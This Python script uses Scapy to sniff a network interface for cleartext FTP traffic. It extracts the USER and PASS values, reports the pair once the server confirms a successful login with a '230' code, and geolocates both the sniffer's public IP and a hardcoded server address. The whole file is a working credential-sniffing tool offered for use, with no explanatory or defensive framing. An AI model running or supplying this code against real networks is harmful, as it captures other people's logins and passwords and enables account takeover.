#! /usr/bin/python

import sys
import pygeoip
import ipgetter

gi = pygeoip.GeoIP('GeoLiteCity.dat')

from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
try:
	from scapy.all import *
except ImportError:
	print '[!] Error: Could not find Scapy installation'
	sys.exit(1)

interface = sys.argv[1]


usernames = ['Error: Could not sniff username']
passwords = ['Error: Could not sniff password']

def validate_login(packet, username, password):
	try:
		if '230' in packet[Raw].load:
			print '[*] Valid Login Credentials Found... '
			print '\t[*] ' + str(packet[IP].dst).strip() + ' -> ' + str(packet[IP].src).strip() + ':'
			print '\t   [*] Username: ' + username
			print '\t   [*] Password: ' + password + '\n'
			print '[*] FTP accessed from: '+'\n'
			dst=ipgetter.myip()
			printRecord(dst)
			print '[*] Unsecure FTP Server location: '+ '\n'
			dst='223.130.4.102'
			printRecord(dst)
			return
		else:
			return
	except Exception:
		return

def printRecord(dst):
    rec = gi.record_by_name(dst)
    city = rec['city']
    country = rec['country_name']
    long = rec['longitude']
    lat = rec['latitude']
    print '[*] Target: ' + dst + ' Geo-located. '
    print '[+] '+str(city)+', '+str(country)
    print '[+] Latitude: '+str(lat)+ ', Longitude: '+ str(long)



def validate_for_ftp(packet):
	if packet.haslayer(TCP) and packet.haslayer(Raw):
		if packet[TCP].dport == 21 or packet[TCP].sport == 21:
			return True
		else:
			return False
	else:
		return False

def validate_packet(packet):
	if validate_for_ftp(packet):
		pass
	else:
		return
	data = packet[Raw].load
	if 'USER ' in data:
		usernames.append(data.split('USER ')[1].strip())
	elif 'PASS ' in data:
		passwords.append(data.split('PASS ')[1].strip())
	else:
		validate_login(packet, usernames[-1], passwords[-1])
	return

print '[*] Sniffing Started on %s... \n' % interface


try:
    sniff(iface=interface, prn=validate_packet, store=0,timeout=100)
except Exception:
	print '[!] Error: Failed to Initialize Sniffing process'
	sys.exit(1)
